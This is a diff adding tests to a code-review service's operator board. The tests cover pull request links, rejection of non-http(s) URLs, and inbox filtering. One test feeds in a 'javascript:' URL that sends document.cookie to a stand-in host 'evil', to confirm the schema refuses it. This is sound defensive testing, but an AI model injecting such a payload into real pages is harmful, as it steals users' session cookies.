@@ -245,6 +245,56 @@ describe("the operator board", () => {
   });
 
   /**
+   * The branch links to the pull request, which is the whole reason to ask for it: a
+   * branch name is not clickable and does not say which forge it lives on.
+   */
+  it("carries the pull request a client named, and nothing when it named none", async () => {
+    store.createReview({
+      id: "revPr", repoId, principal: "alice", branch: "feat/pr", intoRef: "main",
+      ticket: "t", type: "code-arch", state: "running", ladder: initialState(),
+      pullRequest: "https://github.com/o/r/pull/42",
+    });
+    review("revNoPr", "running", "review/deadbeef");
+
+    const body = (await (await fetch(`${base}/board.json`)).json()) as { reviews: Record<string, unknown>[] };
+    const by = Object.fromEntries(body.reviews.map((r) => [r["review_id"] ?? r["id"], r]));
+    expect(by["revPr"]?.["pullRequest"]).toBe("https://github.com/o/r/pull/42");
+    // Absent, not empty string: lore's own reviews run on scratch refs and never have one,
+    // and the page must render plain text rather than a dead link.
+    expect(by["revNoPr"]).not.toHaveProperty("pullRequest");
+  });
+
+  /**
+   * A STORED URL BECOMES AN href ON A PAGE THAT NEEDS NO CREDENTIAL.
+   *
+   * So `javascript:` in it would be a script somebody else chose, running in the
+   * operator's browser, on the one page they open when something is wrong. The schema
+   * refuses it at the door; this proves the door is shut.
+   */
+  it("refuses a pull request URL that is not http(s)", async () => {
+    const res = await mcp(
+      {
+        jsonrpc: "2.0", id: 1, method: "tools/call",
+        params: {
+          name: "review_start",
+          arguments: {
+            branch: "feat/x", into: "main", ticket: "t",
+            pull_request: "javascript:fetch('http://evil/'+document.cookie)",
+          },
+        },
+      },
+      token,
+    );
+    const body = await res.text();
+    expect(body).toContain("pull_request must be an http(s) URL");
+    // And nothing was created on the way to refusing it. Read as a number: node:sqlite
+    // hands back a null-prototype row, which `toStrictEqual` compares by prototype too.
+    const row = store.db.prepare("SELECT COUNT(*) c FROM review WHERE branch = 'feat/x'").get() as
+      { c: number };
+    expect(Number(row.c), "a refused review must not exist").toBe(0);
+  });
+
+  /**
    * A STREAM CARRIES NO HISTORY — the same lesson the MCP subscription docs lead with.
    * A watcher that attached one tick after something happened would otherwise sit in
    * front of a blank board until the next change, which on a quiet service is for ever.
@@ -711,6 +761,25 @@ describe("the inbox lists what is waiting, not only what is fresh", () => {
     expect(p, "a parked review must not vanish because its findings were collected").toBeDefined();
     expect(p?.["new_findings"], "and it is honest that there is nothing new to collect").toBe(0);
     expect(p?.["waiting_on"]).toBe("you");
+  });
+
+  /**
+   * THE ROW CAP MUST NOT UNDO THE FILTER. `listReviews` takes 50 rows and the inbox
+   * filters them afterwards, so ordered by recency alone a wall of freshly-finished
+   * reviews fills the result and the parked one never reaches the filter — invisible
+   * until it expires, which is exactly the abandonment D-95 exists to end, reintroduced
+   * by a LIMIT. Raised by lore's own t2 against the change that added the filter.
+   */
+  it("finds a parked review behind fifty more recent finished ones", async () => {
+    open("revParked", "findings_ready", "feat/parked");
+    store.db.prepare("UPDATE review SET updated_at = ? WHERE id = 'revParked'")
+      .run(new Date(Date.now() - 86_400_000).toISOString());
+    // Fifty terminal reviews, every one of them touched more recently than the parked one.
+    for (let i = 0; i < 50; i++) open(`revDone${i}`, "passed", `feat/done-${i}`);
+
+    const out = await callTool("review_inbox", {});
+    const rows = out["reviews"] as Record<string, unknown>[];
+    expect(rows.map((r) => r["review_id"]), "the one review that needs a person").toContain("revParked");
   });
 
   // The other half of the triage, and the reason to list a review with nothing to do:
